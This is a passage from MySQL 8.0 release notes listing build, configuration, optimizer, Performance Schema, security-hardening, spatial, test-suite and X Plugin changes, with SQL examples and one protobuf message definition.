  A LOB page deletion function failed to delete LOB pages.
  (Bug #24480254)
* Windows builds now use the default runtime libraries (builds use
  the `/MD` flag).
  (Bug #25611609)
* `CMake` support was added for compiling with
  Developer Studio 12.6.
  (Bug #25384295)
* The rapidjson library included in MySQL distributions was
  upgraded to version 1.1.0.
  (Bug #24947436, Bug #83515)
* The minimum version of the Boost library for server builds is
  now 1.63.0.
  (Bug #24579061, Bug #82834, Bug #25126144, Bug #83905)
* For GCC versions higher than 4.4,
  `-fno-expensive-optimizations` was replaced with
  `-ffp-contract=off`, which has the effect of
  enabling more optimizations. Thanks to Alexey Kopytov for the
  patch.
  (Bug #24571672, Bug #82760)
* For building MySQL 8.0, the minimum required version of
  **CMake** is now 3.2.3 on Windows, 3.4.0 on
  Solaris, and 2.8.12 otherwise.
  (Bug #24481181, Bug #82628)

  References: See also: Bug #24687701.
* Work was done to clean up the source code base, including:
  Removing unneeded **CMake** checks; removing
  unused macros from source files; reorganizing header files to
  reduce the number of dependencies and make them more modular,
  removing function declarations without definitions, replacing
  locally written functions with equivalent functions from
  industry-standard libraries.

### Configuration Notes

* In source distributions, several utilities previously in the
  `extra` directory have been moved to the new
  `utilities` directory.
  (Bug #25416084)
* Two new **CMake** options are available for
  debugging. [`LINK_RANDOMIZE`](/doc/refman/8.0/en/source-configuration-options.html#option_cmake_link_randomize)
  indicates whether to randomize the order of symbols in the
  **mysqld** binary (default `OFF`),
  and [`LINK_RANDOMIZE_SEED`](/doc/refman/8.0/en/source-configuration-options.html#option_cmake_link_randomize_seed) specifies
  a seed value for [`LINK_RANDOMIZE`](/doc/refman/8.0/en/source-configuration-options.html#option_cmake_link_randomize).
  (Bug #25336715)
* MySQL failed to compile if
  `-DENABLE_DEBUG_SYNC=OFF` AND
  `-DWITH_DEBUG=ON` were both given. The
  `ENABLE_DEBUG_SYNC` option has been removed and
  enabling [`WITH_DEBUG`](/doc/refman/8.0/en/source-configuration-options.html#option_cmake_with_debug) enables Debug
  Sync.
  (Bug #18374703)
* These changes were made with respect to persisted system
  variables:

  + A new statement, [`RESET
    PERSIST`](/doc/refman/8.0/en/reset-persist.html), enables removal of variable settings that
    were persisted with
    [`SET
    PERSIST`](/doc/refman/8.0/en/set-variable.html) to the
    `mysqld-auto.cnf` file that stores
    persisted global system variable settings.
  + Using [`SET
    PERSIST`](/doc/refman/8.0/en/set-variable.html) (or `@@PERSIST.`) to set
    a global variable to `DEFAULT` or to the
    variable literal default value previously also added a
    setting for the variable to the
    `mysqld-auto.cnf` file if was is not
    present, or removed it from
    `mysqld-auto.cnf` if it was present. Now
    the assignment always adds a setting for the variable to the
    `mysqld-auto.cnf` file; to remove the
    setting from the file, use [`RESET
    PERSIST`](/doc/refman/8.0/en/reset-persist.html).
  + A new Performance Schema table,
    [`persisted_variables`](/doc/refman/8.0/en/performance-schema-persisted-variables-table.html), provides
    an SQL interface to the `mysqld-auto.cnf`
    file, enabling the file contents to be inspected at runtime
    using [`SELECT`](/doc/refman/8.0/en/select.html) statements.
  + The Performance Schema
    [`variables_info`](/doc/refman/8.0/en/performance-schema-variables-info-table.html) table has new
    columns showing when and by which user each system variable
    was most recently set.

  For more information, see
  [Persisted System Variables](/doc/refman/8.0/en/persisted-system-variables.html), and
  [RESET PERSIST Statement](/doc/refman/8.0/en/reset-persist.html).

  If you upgrade to this MySQL release from an earlier version,
  you must run **mysql\_upgrade** (and restart the
  server) to incorporate these changes into the Performance
  Schema.
  (WL #9720, WL #9763)

  References: See also: Bug #24522064.
* The default value of the
  [`query_cache_size`](/doc/refman/5.7/en/server-system-variables.html#sysvar_query_cache_size) system
  variable has been reduced from 1M to 0. Consequently no query
  cache buffer is allocated by default.
  (WL #9817)

### Connection Management Notes

* MySQL Server now includes a plugin library that enables
  administrators to introduce an increasing delay in server
  response to clients after a certain number of consecutive failed
  connection attempts. This capability provides a deterrent that
  slows down brute force attacks that attempt to access MySQL user
  accounts. For more information, see
  [The Connection-Control Plugins](/doc/refman/8.0/en/connection-control.html).
  (WL #8885)

### Data Dictionary Notes

* SQL-layer code and the storage engine API were extended to
  provide data dictionary support for:

  + Storing information about auxiliary columns and keys that
    `InnoDB` adds to tables implicitly, storage
    engine-private data and object identifiers for tables and
    tablespaces, and `InnoDB` full-text search
    auxiliary tables and other similar, implicitly created
    objects.
  + Combining data dictionary updates, storage engine changes,
    and binary log writes for DDL operations into atomic
    transactions.

  A behavior change for [`DROP TABLE`](/doc/refman/8.0/en/drop-table.html)
  occurs if any named tables do not exist. Previously, the
  statement returned an error indicating which tables did not
  exist and it was unable to drop, but also dropped the tables
  that did exist. Now the statement still indicates which tables
  did not exist, but fails with an error and no changes are made.

  For more information, see [Atomic Data Definition Statement Support](/doc/refman/8.0/en/atomic-ddl.html), and
  [WL#7743](https://dev.mysql.com/worklog/task/?id=7743).
  (WL #7743)
* These `INFORMATION_SCHEMA` tables have been
  reimplemented as views on data dictionary tables:

  ```
  EVENTS
  PARAMETERS
  ROUTINES
  TRIGGERS
  ```

  Queries on those tables are now more efficient because they
  obtain information from data dictionary tables rather than by
  other, slower means. For example, the server no longer must
  create a temporary table for each query of the
  `INFORMATION_SCHEMA` table.

  Improvements for those tables also apply to
  [`SHOW`](/doc/refman/8.0/en/show.html) statements that display
  information corresponding to the
  `INFORMATION_SCHEMA` tables. For example,
  [`SHOW TRIGGERS`](/doc/refman/8.0/en/show-triggers.html) displays the same
  information as the [`TRIGGERS`](/doc/refman/8.0/en/information-schema-triggers-table.html) table.

  If you upgrade to this MySQL release from an earlier version,
  you must run **mysql\_upgrade** (and restart the
  server) to incorporate these changes.
  (WL #9494)

### Deprecation and Removal Notes

* **Incompatible Change; InnoDB; Partitioning:**
  The `ALTER TABLE ... UPGRADE PARTITIONING`
  statement is no longer supported.
* The deprecated `PROCEDURE ANALYSE()` syntax has
  been removed.
  (WL #4745)
* The deprecated `libmysqld` embedded server
  library has been removed, along with:

  + The **mysql\_config**
    `--libmysqld-libs`,
    `--embedded-libs`, and
    `--embedded` options
  + The **CMake**
    `WITH_EMBEDDED_SERVER`,
    `WITH_EMBEDDED_SHARED_LIBRARY`, and
    `INSTALL_SECURE_FILE_PRIV_EMBEDDEDDIR`
    options
  + The (undocumented) **mysql**
    `--server-arg` option
  + The **mysqltest**
    `--embedded-server`,
    `--server-arg`, and
    `--server-file` options
  + The **mysqltest\_embedded** and
    **mysql\_client\_test\_embedded** test programs

  (WL #9721, WL #9722, WL #9816)
* The deprecated `--temp-pool` server option has
  been removed.
  (WL #8396)
* The deprecated **replace** utility has been
  removed. If you wish to continue using this utility, be sure to
  retain a copy from an installed version of MySQL before
  upgrading to the current version.
  (WL #9874)
* The parser no longer considers `\N` as a
  synonym for `NULL` in SQL statements. Use
  `NULL` instead.

  This change does not affect text file import or export
  operations performed with [`LOAD
  DATA`](/doc/refman/8.0/en/load-data.html) or
  [`SELECT ... INTO
  OUTFILE`](/doc/refman/8.0/en/select-into.html), for which `NULL` continues
  to be represented by `\N`. See
  [LOAD DATA Statement](/doc/refman/8.0/en/load-data.html).
  (WL #7247)
* Support for DTrace has been removed.
  (WL #9581)

### Optimizer Notes

* **InnoDB:**
  MySQL now supports descending indexes: `DESC`
  in an index definition is no longer ignored but causes storage
  of key values in descending order. Previously, indexes could be
  scanned in reverse order but at a performance penalty. A
  descending index can be scanned in forward order, which is more
  efficient. Descending indexes also make it possible for the
  optimizer to use multiple-column indexes when the most efficient
  scan order mixes ascending order for some columns and descending
  order for others. For more information, see
  [Descending Indexes](/doc/refman/8.0/en/descending-indexes.html).

  Note

  Previously, `GROUP BY` implicitly sorted by
  default (that is, in the absence of `ASC` or
  `DESC` designators for `GROUP
  BY` columns), but relying on implicit `GROUP
  BY` sorting was deprecated. `GROUP
  BY` no longer sorts by default, so query results may
  differ from previous MySQL versions. To produce a given sort
  order, use explicit `ASC` or
  `DESC` designators for `GROUP
  BY` columns or provide an `ORDER BY`
  clause.

  (WL #1074, WL #7737)
* Optimizer trace output now includes more information about
  `filesort` operations, such as key and payload
  size and why addon fields are not packed.
  (Bug #25246184, Bug #84180)
* Previously, invisible indexes were supported only for the
  `InnoDB` storage engine. Invisible indexes are
  now storage engine neutral (supported for any engine).
  (Bug #23541244)
* A [`GROUPING()`](/doc/refman/8.0/en/miscellaneous-functions.html#function_grouping) function has been
  introduced for use in `GROUP BY` queries that
  include a `WITH ROLLUP` modifier. This function
  enables you to distinguish `NULL` values for
  super-aggregate rows in the query result from
  `NULL` values in regular grouped rows. For more
  information, see [Miscellaneous Functions](/doc/refman/8.0/en/miscellaneous-functions.html), and
  [GROUP BY Modifiers](/doc/refman/8.0/en/group-by-modifiers.html). Thanks to Zhe Dong for a
  patch that was partially used to implement this feature.

  Note

  `GROUPING` now is a reserved word and cannot
  be used as an identifier without identifier quoting.

  (Bug #11754449, Bug #46053, Bug #11745963, Bug #21728, WL #1979)
* The optimizer now supports
  [`INDEX_MERGE`](/doc/refman/8.0/en/optimizer-hints.html#optimizer-hints-index-level) and
  [`NO_INDEX_MERGE`](/doc/refman/8.0/en/optimizer-hints.html#optimizer-hints-index-level) hints to affect
  use of the Index Merge access method. Examples:

  ```
  SELECT /*+ INDEX_MERGE(t1 f1, f2, f3) */ f2 FROM t1
    WHERE f1 = 'o' AND f2 = f3 AND f3 <= 4;
  SELECT /*+ NO_INDEX_MERGE(t1 f2, f3) */ f1 FROM t1
    WHERE (f2 = 5 OR f3 = 'c') AND (f1 = 4 OR f4 = 'f');
  ```

  For more information, see
  [Index Merge Optimization](/doc/refman/8.0/en/index-merge-optimization.html), and
  [Optimizer Hints](/doc/refman/8.0/en/optimizer-hints.html).
  (WL #9167)
* The `server_cost` and
  `engine_cost` optimizer cost model tables in
  the `mysql` system database now include a
  `default_value` column that contains the
  default value for each cost table estimate. This column is a
  read-only generated column that retains its value even if the
  associated cost estimate is changed. For more information, see
  [The Optimizer Cost Model](/doc/refman/8.0/en/cost-model.html).

  If you upgrade to this MySQL release from an earlier version,
  you must run **mysql\_upgrade** (and restart the
  server) to incorporate these changes into the
  `mysql` system database.
  (WL #10128)
* In the optimizer cost model `engine_cost`
  table, the cost for memory access was decreased relative to the
  cost for disk access. An implication of this change is that the
  execution plan may change between two runs of the same query.
  For example, at server startup before data has been read into
  the buffer pool, you may get a different plan than after the
  query has been run because then the data will be in memory.
  (WL #8737)
* MySQL now supports common table expressions, both nonrecursive
  and recursive. Common table expressions enable use of named
  temporary result sets, implemented by permitting a
  [`WITH`](/doc/refman/8.0/en/with.html) clause preceding
  [`SELECT`](/doc/refman/8.0/en/select.html) statements and certain
  other statements. For more information, see
  [WITH (Common Table Expressions)](/doc/refman/8.0/en/with.html).

  Note

  `RECURSIVE` now is a reserved word and cannot
  be used as an identifier without identifier quoting.

  (WL #883, WL #3634)
* The optimizer now supports hints that enable specifying the
  order in which to join tables. For more information, see
  [Optimizer Hints](/doc/refman/8.0/en/optimizer-hints.html).
  (WL #9158)

### Packaging Notes

* **Microsoft Windows:**
  *Reminder:* MySQL 8.0 requires the Microsoft
  Visual C++ 2015 Redistributable Package to run on Windows
  platforms. Users should make sure the package has been installed
  on the system before starting the server. The package is
  available at the
  [Microsoft
  Download Center](http://www.microsoft.com/en-us/download/default.aspx).
* Changes in RPM package structure require a larger set of
  packages to be removed to install MySQL Server cleanly.
  (Bug #25603087)
* To avoid potential race conditions, Debian packages now use the
  GNU **install** utility rather than a combination
  of **mkdir**, **touch**, and
  **chown**.
  (Bug #25258829)
* New Debian/Ubuntu packages named `server-core`
  and `client-core` are now available. These
  packages contain binaries only, without configuration or service
  scripts, directory setup, man pages, and so forth. They are
  installed automatically with the standard packages, but when
  installed by themselves do not result in a functioning MySQL
  setup. They may be of interest for user which wish to customize
  their own installation setup.
  (Bug #25146364)
* `scripts/mysql_security_commands.sql` and
  `support-files/mysql.server-sys5.sh` are no
  longer used and have been removed from MySQL distributions.
  (Bug #24756400, Bug #24756442)
* RPM packages now are built with
  [`-DWITH_NUMA=ON`](/doc/refman/8.0/en/source-configuration-options.html#option_cmake_with_numa) for platforms with
  NUMA support: OEL higher than EL5, Fedora, SLES, Docker.
  (Bug #24689078)
* The `my-default.cnf.sh` file (used to produce
  a default `my-default.cnf` or
  `my-default.ini` file) is no longer included
  in source distributions and `my-default.cnf`
  and `my-default.ini` are no longer included
  in or installed by distribution packages.
  (Bug #22525354)
* The unused and undocumented **archive\_reader**
  and **archive\_test** utilities have been removed
  from MySQL source distributions.
  (Bug #12818207, Bug #62014)

### Performance Schema Notes

* The Performance Schema maintains statement event summary tables
  that contain information about minimum, maximum, and average
  statement latency. Those tables permit high-level assessment of
  system performance. To permit assessment at a more fine-grained
  level, the Performance Schema now also collects histogram data
  for statement latencies. These histograms provide additional
  insight into latency distributions and are available in these
  tables:

  + [`events_statements_histogram_by_digest`](/doc/refman/8.0/en/performance-schema-statement-histogram-summary-tables.html):
    Statement histograms per schema and digest value
  + [`events_statements_histogram_global`](/doc/refman/8.0/en/performance-schema-statement-histogram-summary-tables.html):
    Statement histogram summarized globally

  For more information, see
  [Statement Histogram Summary Tables](/doc/refman/8.0/en/performance-schema-statement-histogram-summary-tables.html).

  In addition, the
  [`events_statements_summary_by_digest`](/doc/refman/8.0/en/performance-schema-statement-summary-tables.html)
  table now has columns that provide percentile information about
  statement latencies. For more information, see
  [Statement Summary Tables](/doc/refman/8.0/en/performance-schema-statement-summary-tables.html).

  If you upgrade to this MySQL release from an earlier version,
  you must run **mysql\_upgrade** (and restart the
  server) to incorporate these changes into the Performance
  Schema.
  (WL #5384)
* System and status variable information is no longer maintained
  in the `INFORMATION_SCHEMA`. These tables have
  been removed: `GLOBAL_VARIABLES`,
  `SESSION_VARIABLES`,
  `GLOBAL_STATUS`,
  `SESSION_STATUS`. Use the corresponding
  Performance Schema tables instead. See
  [Performance Schema System Variable Tables](/doc/refman/8.0/en/performance-schema-system-variable-tables.html), and
  [Performance Schema Status Variable Tables](/doc/refman/8.0/en/performance-schema-status-variable-tables.html). In
  addition, the `show_compatibility_56` system
  variable has been removed. It was used in the transition period
  during which system and status variable information in
  `INFORMATION_SCHEMA` tables was moved to
  Performance Schema tables, and is no longer needed. These status
  variables have been removed:
  `Slave_heartbeat_period`,
  `Slave_last_heartbeat`,
  `Slave_received_heartbeats`,
  `Slave_retried_transactions`,
  `Slave_running`. The information they provided
  is available in Performance Schema tables; see
  [Migrating to Performance Schema System and Status Variable Tables](/doc/refman/5.7/en/performance-schema-variable-table-migration.html).
  (WL #8057)
* The deprecated `INFORMATION_SCHEMA`
  `INNODB_LOCKS` and
  `INNODB_LOCK_WAITS` tables have been removed.
  To obtain `InnoDB` data lock information, use
  the Performance Schema [`data_locks`](/doc/refman/8.0/en/performance-schema-data-locks-table.html)
  and [`data_lock_waits`](/doc/refman/8.0/en/performance-schema-data-lock-waits-table.html) tables instead.
  Alternatively, use the `sys` schema
  [`innodb_lock_waits`](/doc/refman/8.0/en/sys-innodb-lock-waits.html) and
  [`x$innodb_lock_waits`](/doc/refman/8.0/en/sys-innodb-lock-waits.html) views, which
  have been reimplemented to use the new Performance Schema tables
  rather than the removed `INFORMATION_SCHEMA`
  tables.

  The Performance Schema tables expose what data locks exist,
  which transaction holds each lock, and which transaction lock
  requests are blocked by other locks. For
  `InnoDB`, the
  [`data_locks`](/doc/refman/8.0/en/performance-schema-data-locks-table.html) table reports all data
  locks, in contrast to the `INNODB_LOCKS` table,
  which reported only waited-for data locks, For more information,
  see [The data\_locks Table](/doc/refman/8.0/en/performance-schema-data-locks-table.html), and
  [The data\_lock\_waits Table](/doc/refman/8.0/en/performance-schema-data-lock-waits-table.html). For
  information about mapping old table columns to new table
  columns, see
  [The INFORMATION\_SCHEMA INNODB\_LOCKS Table](/doc/refman/5.7/en/information-schema-innodb-locks-table.html), and
  [The INFORMATION\_SCHEMA INNODB\_LOCK\_WAITS Table](/doc/refman/5.7/en/information-schema-innodb-lock-waits-table.html).

  The tables differ in the privileges required: The
  `INFORMATION_SCHEMA` tables require the global
  [`PROCESS`](/doc/refman/8.0/en/privileges-provided.html#priv_process) privilege. The
  Performance Schema tables require the usual Performance Schema
  privilege of [`SELECT`](/doc/refman/8.0/en/privileges-provided.html#priv_select) on the table
  to be selected from.

  The `sys` schema
  [`innodb_lock_waits`](/doc/refman/8.0/en/sys-innodb-lock-waits.html) and
  [`x$innodb_lock_waits`](/doc/refman/8.0/en/sys-innodb-lock-waits.html) views can be
  used without change, with the exception that the
  `locked_table` column containing combined
  schema/table name values has been removed and replaced with
  `locked_table_schema` and
  `locked_table_name` columns that contain
  separate schema and table name values. In addition, these views
  now contain `locked_table_partition` and
  `locked_table_subpartition` columns. For more
  information, see [The innodb\_lock\_waits and x$innodb\_lock\_waits Views](/doc/refman/8.0/en/sys-innodb-lock-waits.html),

  If you upgrade to this MySQL release from an earlier version,
  you must run **mysql\_upgrade** (and restart the
  server) to incorporate these changes into the Performance Schema
  and the `sys` schema.
  (WL #9275, WL #6657)

### Plugin Notes

* MySQL Server 8.0 includes a component-based infrastructure for
  improving server extensibility; see
  [MySQL Components](/doc/refman/8.0/en/components.html). However, MySQL plugins use an
  interface that predates the component interface. A new plugin
  service, `plugin_registry_service`, enables
  plugins to access the component registry and its services.
  (WL #4989)

### Security Notes

* **Incompatible Change:**
  For `STANDALONE` and `WIN`
  builds, the default
  [`secure_file_priv`](/doc/refman/8.0/en/server-system-variables.html#sysvar_secure_file_priv) value has
  changed from the empty string to `NULL`. This
  is a secure-by-default setting because it disables import and
  export operations. To permit those operations, set
  [`secure_file_priv`](/doc/refman/8.0/en/server-system-variables.html#sysvar_secure_file_priv) to the path
  name of the directory to use for those operations.
  (Bug #24679907, Bug #24695274, Bug #24707666, WL #6782)
* **Incompatible Change:**
  These changes were made to **mysqld\_safe**:

  + Unsafe use of **rm** and
    **chown** in **mysqld\_safe**
    could result in privilege escalation.
    **chown** now can be used only when the
    target directory is `/var/log`. An
    incompatible change is that if the directory for the Unix
    socket file is missing, it is no longer created; instead, an
    error occurs. Due to these changes,
    **/bin/bash** is required to run
    **mysqld\_safe** on Solaris.
    **/bin/sh** is still used on other Unix/Linux
    platforms.
  + The [`--ledir`](/doc/refman/8.0/en/mysqld-safe.html#option_mysqld_safe_ledir) option now
    is accepted only on the command line, not in option files.
  + **mysqld\_safe** ignores the current working
    directory.

  Other related changes:

  + Initialization scripts that invoke
    **mysqld\_safe** pass
    `--basedir` explicitly.
  + Initialization scripts create the error log file only if the
    base directory is `/var/log` or
    `/var/lib`.
  + Unused systemd files for SLES were removed.

  References: See also: Bug #24464380, Bug #24388753, Bug #24619033, Bug #82920.
* yaSSL was upgraded to version 2.4.2. This upgrade corrects
  issues with: Potential AES side channel leaks; DSA padding for
  unusual sizes; the
  `SSL_CTX_load_verify_locations()` OpenSSL
  compatibility function failing to handle long path directory
  names.
  (Bug #24512715, Bug #24740291)
* OpenSSL is ending support for version 1.0.1 in December 2016;
  see
  <https://www.openssl.org/policies/releasestrat.html>.
  Consequently, MySQL Commercial Server builds now use version
  1.0.2 rather than version 1.0.1, and the linked OpenSSL library
  for the MySQL Commercial Server has been updated from version
  1.0.1 to version 1.0.2j. For a description of issues fixed in
  this version, see
  <https://www.openssl.org/news/vulnerabilities.html>.

  This change does not affect the Oracle-produced MySQL Community
  build of MySQL Server, which uses the yaSSL library instead.
  (WL #9136)

### Spatial Data Support

* **Incompatible Change:**
  Previously, [`ST_Distance()`](/doc/refman/8.0/en/spatial-relation-functions-object-shapes.html#function_st-distance)
  supported only Cartesian spatial reference systems (SRSs).
  [`ST_Distance()`](/doc/refman/8.0/en/spatial-relation-functions-object-shapes.html#function_st-distance) now detects
  geometry arguments in a geographic SRS and returns the geodetic
  distance on the ellipsoid in meters. The only permitted
  geographic argument types are `Point` and
  `Point`, or `Point` and
  `MultiPoint` (in any argument order).
  Calculations for projected SRSs and SRID 0 remain the same. For
  more information, see
  [Spatial Relation Functions That Use Object Shapes](/doc/refman/8.0/en/spatial-relation-functions-object-shapes.html).

  Note

  If spatial data contains SRID values that refer to a
  geographic spatial reference system, existing queries using
  these functions will return different results, compared to
  previous MySQL versions.

  (WL #9347)
* **Incompatible Change:**
  These functions previously accepted either WKB strings or
  geometry arguments. Geometry arguments are no longer permitted
  and produce an error.

  + [`ST_GeomCollFromWKB()`](/doc/refman/8.0/en/gis-wkb-functions.html#function_st-geomcollfromwkb),
    [`ST_GeometryCollectionFromWKB()`](/doc/refman/8.0/en/gis-wkb-functions.html#function_st-geomcollfromwkb)

  For information about migrating queries that refer to those
  functions away from using geometry arguments to using WKB
  arguments, see [Functions That Create Geometry Values from WKB Values](/doc/refman/8.0/en/gis-wkb-functions.html).
  (WL #10166)
* **Incompatible Change:**
  These functions now interpret latitude and longitude coordinates
  as in the order specified by the spatial reference system. The
  functions also accept an optional argument to override the
  default axis order.

  + [`ST_GeomCollFromText()`](/doc/refman/8.0/en/gis-wkt-functions.html#function_st-geomcollfromtext),

  Note

  If spatial data contains SRID values that refer to a
  geographic spatial reference system, existing queries using
  these functions will return different results, compared to
  previous MySQL versions.

  (WL #9434, WL #9435)
* **Incompatible Change:**
  These functions now return latitude and longitude coordinates in
  the order specified by the spatial reference system that applies
  to the geometry value argument. The functions also accept an
  optional argument to override the default axis order.

  (WL #9432, WL #9433)
* The `st_spatial_reference_systems` data
  dictionary table that stores information about spatial reference
  systems other than SRID 0 has been upgraded from EPSG Dataset
  8.7 to 9.0. Also, the table contents are now exposed through the
  `INFORMATION_SCHEMA`
  [`ST_SPATIAL_REFERENCE_SYSTEMS`](/doc/refman/8.0/en/information-schema-st-spatial-reference-systems-table.html) table,
  which is implemented as a view on the data dictionary For more
  information, see
  [The INFORMATION\_SCHEMA ST\_SPATIAL\_REFERENCE\_SYSTEMS Table](/doc/refman/8.0/en/information-schema-st-spatial-reference-systems-table.html).

  MySQL now has an `INFORMATION_SCHEMA`
  [`ST_GEOMETRY_COLUMNS`](/doc/refman/8.0/en/information-schema-st-geometry-columns-table.html) table that
  provides information about table columns that store spatial
  data. The new table is implemented as a view on the existing
  `INFORMATION_SCHEMA`
  [`COLUMNS`](/doc/refman/8.0/en/information-schema-columns-table.html) table. For more
  information, see
  [The INFORMATION\_SCHEMA ST\_GEOMETRY\_COLUMNS Table](/doc/refman/8.0/en/information-schema-st-geometry-columns-table.html).

  If you upgrade to this MySQL release from an earlier version,
  you must run **mysql\_upgrade** (and restart the
  server) to incorporate these
  `INFORMATION_SCHEMA` changes.
  (Bug #25337054, Bug #84384, WL #9348, WL #8582)
* A new spatial function,
  [`ST_SwapXY()`](/doc/refman/8.0/en/gis-format-conversion-functions.html#function_st-swapxy), accepts a geometry
  argument and swaps the X and Y values of each coordinate pair
  within the geometry. For more information, see
  [Geometry Format Conversion Functions](/doc/refman/8.0/en/gis-format-conversion-functions.html).
  (WL #9436)

### SQL Syntax Notes

* Derived table syntax now permits a list of explicit column names
  following the table name, to override the default column names
  taken from the select list. For example, the column names for
  this derived table come from its select list:

  ```
  mysql> SELECT * FROM (SELECT 1, 2, 3, 4) AS dt;
  +---+---+---+---+
  | 1 | 2 | 3 | 4 |
  +---+---+---+---+
  | 1 | 2 | 3 | 4 |
  +---+---+---+---+
  ```

  To provide column names, follow the derived table name with a
  parenthesized list of column names:

  ```
  mysql> SELECT * FROM (SELECT 1, 2, 3, 4) AS dt (a, b, c, d);
  +---+---+---+---+
  | a | b | c | d |
  +---+---+---+---+
  | 1 | 2 | 3 | 4 |
  +---+---+---+---+
  ```

  (WL #883)

### Test Suite Notes

* **mysql-test-run.pl** now has a
  `--charset-for-testdb=charset_name`
  option for specifying the default character set for the
  `test` database. The default value is
  `latin1`.
  (Bug #25494068, Bug #84806)
* **mysql-test-run.pl** now has an
  `--only-big-tests` option, which causes only big
  tests to run. Normal (non-big) tests are skipped. If both
  `--big-test` and
  `--only-big-tests` are given,
  `--only-big-tests` is ignored.
  (Bug #25182306)
* **mysql-test-run.pl** has a new
  `--discover` option. When given,
  **mysql-test-run.pl** attempts to preload
  `discover`, the Developer Studio Memory Error
  Discovery Tool when starting **mysqld**. Reports
  from `discover` may be found in
  `log/mysqld.%p.txt` under the directory given
  by `--vardir`. This option is supported only on
  SPARC-M7 systems.
  (Bug #25048971)
* **mysqltest** now supports an
  `expr` command that enables an expression to be
  evaluated and assigned to a variable. For details, see the
  command description in the MySQL Server Doxygen documentation,
  available at
  [https://dev.mysql.com/doc/index-other.html](/doc/index-other.html).
  (Bug #24806741)
* **mysqltest** now supports a
  `force-cpdir` command that copies a source
  directory to a destination directory recursively (that is, it
  copies subdirectories).
  (Bug #24806681)
* **mysql-test-run.pl** has a new
  `--summary-report` option. When given,
  **mysql-test-run.pl** generates a plain text
  version of the test summary only and writes it to the file named
  as the option argument. The file is suitable for sending by
  email.
  (Bug #24512357, Bug #82708)
* **mysql-test-run.pl** could not be run with
  --valgrind-option=--tool=custom\_tool, for values of
  *`custom_tool`* such as
  **massif** or **helgrind**,
  because it added the options for **memcheck**
  that might not be understood by other tools. Also, the
  **mysql-test-run.pl**
  `--callgrind` option did not work because it
  supplied an invalid `--base` option to
  **callgrind**. Thanks to Daniel Black for the
  patch on which the fixes were based.
  (Bug #23713613, Bug #82039)
* The **mysqltest** `connect()`
  function now permits `SOCKET` and
  `TCP` values for the `options`
  argument, to specify using the socket-file and TCP/IP connection
  protocols.

  In addition, transport protocols now must match the current
  system. Previously, passing `PIPE` or
  `SHM` on non-Windows systems caused the default
  (socket-file) transport protocol to be used. Now this causes an
  error, and, similarly, passing `SOCKET` on
  Windows systems causes an error.
  (Bug #21046241)
* **mysql-test-run.pl** now supports a
  `--bootstrap` option that enables
  **mysqld** options to be designated as bootstrap
  options. When `mysql-test-run.pl` finds
  `--bootstrap` options in a
  `master.opt` file, it removes and
  reinitializes the data directory and restarts the server with
  the new option settings.
  (Bug #18184868)

### X Plugin Notes

* The `MYSQLX_TCP_PORT`
  **CMake** option was ignored.
  (Bug #25493867, Bug #84804)
* The protobuf compiler emitted “unused import”
  warnings for mysqlx.proto.
  (Bug #25444009, Bug #84641)
* Connections were released which were not initialized when
  validation occurred.
  (Bug #25392280)
* The [`Mysqlx_notice_warning_sent`](/doc/refman/8.0/en/x-plugin-status-variables.html#statvar_Mysqlx_notice_warning_sent)
  and [`Mysqlx_notice_other_sent`](/doc/refman/8.0/en/x-plugin-status-variables.html#statvar_Mysqlx_notice_other_sent)
  status variable values did not increment as expected.
  (Bug #25289949, Bug #84258, Bug #25290001, Bug #84260)
* The manual definition of the
  `MYSQL_DYNAMIC_PLUGIN` macro was redundant.
  (Bug #25162590, Bug #83988)
* IPv6 connectivity support defined a new system variable
  [`mysqlx_bind_address`](/doc/refman/8.0/en/x-plugin-options-system-variables.html#sysvar_mysqlx_bind_address) with the
  default value of '0.0.0.0', but the default value should have
  been '\*' so that connections to X Plugin may be made using an
  IPv6 address, an IPv4 address, or a hostname.
  (Bug #25047909, Bug #83688)
* The `stmt` field was marked as
  `required` in the message:

  ```
  message Mysqlx.Crud.ModifyView {
     required Collection collection = 1;

     optional string definer = 2;
     optional ViewAlgorithm algorithm = 3;
     optional ViewSqlSecurity security = 4;
     optional ViewCheckOption check = 5;

     repeated string column = 6;
     required Mysqlx.Crud.Find stmt = 7;
  }
  ```

  (Bug #24968735, Bug #83595)
* For a table created with `CREATE TABLE foo (doc
  JSON)`, the statement `list_objects`
  incorrectly reported the table as a collection.
  (Bug #24963952)
* Sending `Expect.Open` to a connected socket
  before authentication led to the following error messages:

  ```
  ... Plugin mysqlx reported: '10: Invalid message 24 received during client initialization'
  ... Plugin mysqlx reported: '10: ERROR reading from socket Bad file descriptor (9) 2'
  ```

  (Bug #24940144, Bug #83494)
* On Linux, MySQL Shell in JavaScript and Python interactive mode
  hid collections if the lettercase in the collection name was not
  uniform.
  (Bug #24848125)
* If multiple user accounts exist that match the authenticating
  user, the X Plugin would attempt to authenticate all matching
  accounts instead of the best matching account.
  (Bug #24847537)
* Boost classes with corresponding functionality in C++ 11 were
  moved or wrapped.
  (Bug #24680856)
* When two X Plugin instances were started on the same port, the
  resulting error message was split over two lines and contained
  duplicate information.
  (Bug #24679018, Bug #83008)
* The `performance_schema.threads` table did not
  show `processlist` statistics for the X Plugin.
  (Bug #24638038)
* If the client sent an unknown message type to the server, the
  server would send back an error message and then disconnect the
  client.
  (Bug #24611754, Bug #82868)
* When the client sent a zero length message, the X Plugin did not
  send a response. For a subsequent message the client received an
  error `E_X_BAD_MESSAGE` and was disconnected,
  depending on the header content.
  (Bug #24595459, Bug #82862)
* X Plugin displayed its version to any connected user, including
  those not authenticated.
  (Bug #24562707, Bug #82784)
* X Plugin generated an incorrect query when a duplicate field
  name existed in an `Update` statement.
  (Bug #24510083)
* The statement `list_objects` returned incorrect
  information for some views in `sys` database.
  (Bug #24472325)
* X Plugin was trying to send result sets to a client, even where
  the connection had been closed. The plugin now stops execution
  of a stored procedure if the connection is reset.
  (Bug #24440344)
* Attempting to list objects using the
  `list_objects` statement without explicitly
  setting the database name resulted in the collection being
  incorrectly classified as a table.
  (Bug #23205895, Bug #81248)
* X Plugin now supports the `sha256_password`
  plugin.
  (WL #9271)

### Functionality Added or Changed

* **Incompatible Change:**
  Previously, for `INSERT ... SELECT ... ON DUPLICATE KEY
  UPDATE` statements for which the
  `UPDATE` referred to `SELECT`
  columns, the results could be incorrect if the
  `SELECT` was a `UNION`. Now
  such statements are prohibited and produce an error. To work
  around this restriction, write the
  [`UNION`](/doc/refman/8.0/en/union.html) as a derived table so that
  its rows can be treated as a single-table result set, which is
  permitted. See [INSERT ... ON DUPLICATE KEY UPDATE Statement](/doc/refman/8.0/en/insert-on-duplicate.html).
  (WL #5094)
* **InnoDB:**
